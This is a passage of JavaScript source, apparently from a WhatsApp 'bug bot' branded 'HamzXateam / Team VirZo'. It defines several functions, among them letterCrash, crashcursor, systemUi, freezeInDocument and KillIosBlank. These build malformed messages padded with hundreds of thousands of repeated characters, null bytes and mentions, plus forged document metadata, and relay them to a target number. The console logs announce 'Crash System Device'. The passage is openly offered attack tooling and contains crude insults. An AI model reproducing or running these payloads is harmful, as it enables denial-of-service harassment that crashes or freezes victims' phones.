              text: "ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ𓍯̤𖣂  *𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐓𝐞𝐚𝐦 𝐕𝐢𝐫𝐙𝐨͢*҉ - U I\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ҉          𖣂𓍯̤\n" + "\n\n\n\n\n\n\n\n\n\n\n\n@6281262797207".repeat(27000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{}"
            },
            contextInfo: {
              mentionedJid: ["6281262797207@s.whatsapp.net"],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ""
                }
              }
            }
          }
        }
      }
    }, X ? {
      participant: {
        jid: X
      }
    } : {});
    console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ *𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐓𝐞𝐚𝐦 𝐕𝐢𝐫𝐙𝐨͢* ⿻ ▾⭑"));
  }
async function letterCrash(X, Ptcp = true) {
let virtex = "*𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐓𝐞𝐚𝐦 𝐕𝐢𝐫𝐙𝐨͢*" + "ꦾ".repeat(77777) + "@1".repeat(77777);
	var messageContent = generateWAMessageFromContent(X, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `${idsal}`,
							"newsletterName": virtex,
							"jpegThumbnail": "",
							"caption": virtex,
							"inviteExpiration": Date.now() + 1814400000
						},
						contextInfo: {
                  mentionedJid: ["6283129626211@s.whatsapp.net"],
                  groupMentions: [{ groupJid: `${idsal}`, groupSubject: virtex }]
                    }
					}
				}
			}), {
				'userJid': X
			});
			await hamz.relayMessage(X, messageContent.message, {
				'participant': {
					'jid': X
				},
				'messageId': messageContent.key.id
		});
            console.log(chalk.red.bold('Crash System Device *𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐓𝐞𝐚𝐦 𝐕𝐢𝐫𝐙𝐨͢*'))
}

   async function XeonXRobust(X, Ptcp = true) {
	const jids = `_*~@916909137213~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(50000);
   await hamz.relayMessage(X, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: "",
         },
         hasMediaAttachment: true,
        },

									body: { text: '*𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐓𝐞𝐚𝐦 𝐕𝐢𝐫𝐙𝐨͢*' + ui + jids },
									contextInfo: {
										mentionedJid: ['916909137213@s.whatsapp.net'],
										mentions: ['916909137213@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 ⿻ 𝐓𝐞𝐚𝐦 𝐕𝐢𝐫𝐙𝐨",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: X
     }
    } : {}
   );
	}
async function crashcursor(target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "🩸⃟⃨〫⃰‣ ⁖𝐇𝐚𝐦𝐳 𝐗𝐀 𝐓𝐞𝐚𝐦 ‣—" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: hamz.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "🩸⃟⃨〫⃰‣ ⁖𝐃͢𝚺𝐕𝚹𝐑𝐒𝐢͢𝚾𝐂𝚹𝐑͢𝚺 ‣—",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "༑ Fail Beta - ( 🩸⃟⃨〫⃰‣ ⁖𝐇𝐚𝐦𝐳 𝐗𝐀 𝐓𝐞𝐚𝐦 ‣— ) \"👋\"",
                    footerText: "© running since 2020 to 20##?",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "𐎟 𝐓𝐝͢𝐗 ⿻ 𝐂͢𝐋𝐢𝚵͢𝐍𝐓͢ 𐎟"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: TDX,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "🩸⃟⃨〫⃰‣ ⁖𝐇𝐚𝐦𝐳 𝐗𝐀 𝐓𝐞𝐚𝐦 ‣—s",
entryPointConversionApp: "🩸⃟⃨〫⃰‣ ⁖𝐇𝐚𝐦𝐳 𝐗𝐀 𝐓𝐞𝐚𝐦 ‣—s",
actionLink: {
url: "t.me/hamzzz",
buttonTitle: "🩸⃟⃨〫⃰‣ ⁖𝐇𝐚𝐦𝐳 𝐗𝐀 𝐓𝐞𝐚𝐦 ‣—"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "🩸⃟⃨〫⃰‣ ⁖𝐇𝐚𝐦𝐳 𝐗𝐀 𝐓𝐞𝐚𝐦 ‣—",
parentGroupJid: "🩸⃟⃨〫⃰‣ ⁖𝐇𝐚𝐦𝐳 𝐗𝐀 𝐓𝐞𝐚𝐦 ‣—ll",
trustBannerType: "🩸⃟⃨〫⃰‣ ⁖𝐇𝐚𝐦𝐳 𝐗𝐀 𝐓𝐞𝐚𝐦 ‣—",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! 🩸⃟⃨〫⃰‣ ⁖𝐇𝐚𝐦𝐳 𝐗𝐀 𝐓𝐞𝐚𝐦 ‣— - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© running since 2020 to 20##?",
thumbnail: TDX, 
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "🩸⃟⃨〫⃰‣ ⁖𝐇𝐚𝐦𝐳 𝐗𝐀 𝐓𝐞𝐚𝐦 ‣—",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "🩸⃟⃨〫⃰‣ ⁖𝐇𝐚𝐦𝐳 𝐗𝐀 𝐓𝐞𝐚𝐦 ‣—"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: `${idsal}`,
serverMessageId: 1,
newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "🩸⃟⃨〫⃰‣ ⁖𝐇𝐚𝐦𝐳 𝐗𝐀 𝐓𝐞𝐚𝐦 ‣—"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "by : Hamz"
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await hamz.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}
async function kamuflaseFreeze(hamz, target) {
    let messagePayload = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {},
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "i'm XA Team"
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "review_and_pay",
                                buttonParamsJson: JSON.stringify({
                                    currency: "IDR",
                                    total_amount: { value: 6100, offset: 100 },
                                    reference_id: "4Q79X9PCBEM",
                                    type: "physical-goods",
                                    order: {
                                        status: "completed",
                                        subtotal: { value: 0, offset: 100 },
                                        order_type: "PAYMENT_REQUEST",
                                        items: [
                                            {
                                                retailer_id: "custom-item-7fca9870-8e3a-4a4a-bfb7-8a07fbf5fa9e",
                                                name: "@1".repeat(70000),
                                                amount: { value: 6100, offset: 100 },
                                                quantity: 1
                                            }
                                        ]
                                    },
                                    additional_note: "i'm XA Team",
                                    native_payment_methods: [],
                                    share_payment_status: false
                                })
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [
                            {
                                groupJid: "1@newsletter",
                                groupSubject: "XA Team"
                            }
                        ],
                        isForwarded: true,
                        quotedMessage: {
                            interactiveResponseMessage: {
                                body: {
                                    text: "Sent",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "galaxy_message",
                                    paramsJson: `{
                                        "screen_2_OptIn_0": true,
                                        "screen_2_OptIn_1": true,
                                        "screen_1_Dropdown_0": "HamzDev",
                                        "screen_1_DatePicker_1": "1028995200000",
                                        "screen_1_TextInput_2": "hamz@gmail.com",
                                        "screen_1_TextInput_3": "94643116",
                                        "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(900000)}",
                                        "screen_0_TextInput_1": "Why?",
                                        "screen_0_Dropdown_2": "001-Grimgar",
                                        "screen_0_RadioButtonsGroup_3": "0_true",
                                        "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                    }`,
                                    version: 3
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    hamz.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}

async function systemUi(hamz, target) {
    hamz.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Fuck" + "ꦾ".repeat(250000) + "@1".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "You" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
};

async function freezeInDocument(hamz, target) {
    hamz.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/pdf",
                        fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                        fileLength: "1991837291999",
                        pageCount: 199183729199991,
                        mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                        fileName: "HamzDev",
                        fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                        directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1728631701",
                        contactVcard: true,
                        caption: "゙゙゙゙゙゙".repeat(100) + "@1".repeat(90000),
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "XA Team" }],
                            isForwarded: true,
                            quotedMessage: {
                                interactiveResponseMessage: {
                                    body: { 
                                        text: "Sent", 
                                        format: "DEFAULT" 
                                    },
                                    nativeFlowResponseMessage: {
                                        name: "galaxy_message",
                                        paramsJson: `{
                                            "screen_2_OptIn_0": true,
                                            "screen_2_OptIn_1": true,
                                            "screen_1_Dropdown_0": "HamzDev",
                                            "screen_1_DatePicker_1": "1028995200000",
                                            "screen_1_TextInput_2": "hamz@gmail.com",
                                            "screen_1_TextInput_3": "94643116",
                                            "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(700000)}",
                                            "screen_0_TextInput_1": "Why?",
                                            "screen_0_Dropdown_2": "001-Grimgar",
                                            "screen_0_RadioButtonsGroup_3": "0_true",
                                            "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                        version: 3
                                    },
                                }
                            }
                        }
                    }
                }
            }
        },
        { participant: { jid: target } }
    );
}

async function travaIos(hamz, target) {
    await hamz.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: "FBPAY",
                expiryTimestamp: Date.now() + 1814400000
            }
        },
        {
            participant: {
                jid: target
            }
        }
    );
};

async function travaIosKill(hamz, target) {
    await hamz.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: "UPI",
                expiryTimestamp: Date.now() + 1814400000
            }
        },
        {
            participant: {
                jid: target
            }
        }
    );
};

async function KillIosBlank(hamz, target) {
   let TravaIphone = "𑇂𑆵𑆴𑆿".repeat(60000)
    await hamz.relayMessage(
        target,
        {
            locationMessage: {
                degreesLatitude: 173.282,
                degreesLongitude: -19.378,
                name: "😘" + TravaIphone,
                url: "http://t.me/MOTU_PATALU_HINDU_HAI"
            }
        },
        {}
    );
};

async function carouselCrashMsg(hamz, target) {
    hamz.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "i'm XA Team" + "ꦾ".repeat(120000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "HamzDev"
                    },
                    carouselMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "XA Team" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
};

async function callXgalaxy(hamz, target) {
  hamz.relayMessage(target, {
    viewOnceMessage: {
        message: {
            interactiveMessage: {
                header: {
                    documentMessage: {
                        url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                        mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                        fileLength: "999999999",
                        pageCount: 0x9184e729fff,
                        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                        fileName: "Fuck You",
                        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                        directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                        mediaKeyTimestamp: "1715880173",
                        contactVcard: true
                    },
                    title: "",
                    hasMediaAttachment: true
                },
                body: {
                    text: ""
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'call_permission_request',
                            buttonParamsJson: '{}'
                        }
                    ]
                },
                contextInfo: {
                    quotedMessage: {
                        interactiveResponseMessage: {
                            body: { 
                                text: "Sent", 
                                format: "DEFAULT" 
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: `{
                                    "screen_2_OptIn_0": true,
                                    "screen_2_OptIn_1": true,
